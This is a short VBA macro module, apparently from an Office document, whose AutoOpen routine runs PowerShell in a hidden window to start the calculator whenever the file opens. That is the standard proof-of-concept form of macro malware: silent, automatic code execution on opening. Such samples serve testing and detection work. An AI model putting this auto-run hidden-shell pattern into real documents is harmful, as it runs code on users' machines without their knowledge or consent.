Attribute VB_Name = "ThisDocument"
Sub AutoOpen()
    Shell "powershell -w hidden -c calc", vbHide
End Sub
